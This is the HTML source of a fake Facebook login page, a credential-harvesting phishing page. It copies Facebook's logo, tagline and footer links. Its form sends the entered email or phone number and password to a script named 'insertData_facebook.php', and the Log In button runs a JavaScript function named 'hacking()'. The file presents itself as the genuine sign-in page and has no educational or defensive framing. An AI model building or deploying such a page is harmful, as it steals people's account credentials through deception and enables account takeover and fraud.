<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" type="text/css">
    <link rel="stylesheet" href="bootstrap.min.css" type="text/css">
    <title>facebook</title>
</head>
<body>
    <section>
        <div class="container">
            <div class="row">
                <div class="col-lg-6 facebook-principal">
                    <img src="facebook.svg" alt="" class="facebook">
                    <p class="text-connect">Connect with friends and the world around you on Facebook.</p>
                </div>
                <div class="col-lg-4 formular">
                    <form action="insertData_facebook.php" method="post">
                        <div class="mail">
                            <input type="text" class="form-control" name="email" id="email" placeholder="Email or Phone Number">
                        </div>
                        <div class="password">
                            <input type="password" class="form-control" name="pass" id="password" placeholder="Password">
                        </div>
                        <div><i id="valeur"></i></div>
                        <div class="boutton-submit">
                            <button id="submit" onclick="hacking()" type="submit"><b>Log In</b></button>
                        </div>
                    </form>
                    <div class="forgot">
                        <a href="#">Forget password?</a>
                    </div>
                    <div  class="spacement">
                        <hr>
                    </div>
                    <div class="creat-account">
                        <button class="button"><b>Create a New Acount</b></button>
                    </div>
                </div>
            </div>
        </div>

        
    </section>
    <aside>
        <ul class="list-item">
            <li><a href="#">English (US)</a> </li>
            <li><a href="#">Français (France)</a> </li>
            <li><a href="#">Malagasy</a></li>
            <li><a href="#">Italiano</a></li>
            <li><a href="#">Español</a></li>
            <li><a href="#">Deutsch</a></li>
            <li><a href="">中文(简体)</a></li>
            <li><a href="#">Türkçe</a></li>
            <li><a href="#">Português (Brasil)</a></li>
            <li><a href="#">العربية</a></li>
            <li><a href="#">हिन्दी</a></li>
        </ul>        
    </aside>
<hr>
    <footer class="mode-to-do">
        <ul>
            <li><a href="#">Sign Up</a></li>
            <li><a href="#">Log In</a></li>
            <li><a href="#">Messenger</a></li>
            <li><a href="#">Facebook Lite</a></li>
            <li><a href="#">Watch</a></li>
            <li><a href="#">People</a></li>
            <li><a href="#">Pages</a></li>
            <li><a href="#">Page Categories</a></li>
            <li><a href="#">Places</a></li>
            <li><a href="#">Games</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Marketplace</a></li>
            <li><a href="#">Facebook Pay</a></li>
            <li><a href="#">Groups</a></li>
       </ul>
       <ul>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Oculus</a></li>
            <li><a href="#">Portal</a></li>
            <li><a href="#">Instagram</a></li>
            <li><a href="#">Local</a></li>
            <li><a href="#">Fundraisers</a></li>
            <li><a href="#">Services</a></li>
            <li><a href="#">Voting Information Center</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Create Ad</a></li>
            <li><a href="#">Create Page</a></li>
            <li><a href="#">Developers</a></li>
            <li><a href="#">Careers</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Cookies</a></li>
       </ul>
       <ul>
            <li><a href="#">Ad Choices</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">Settings</a></li>
            <li><a href="#">Activity Log</a></li>
        </ul>
        <div class="copy-right">
            <p>    Facebook © 2021
            </p>
        </div>
    </footer>


    <script src="jolie.js">
    </script>
</body>
</html>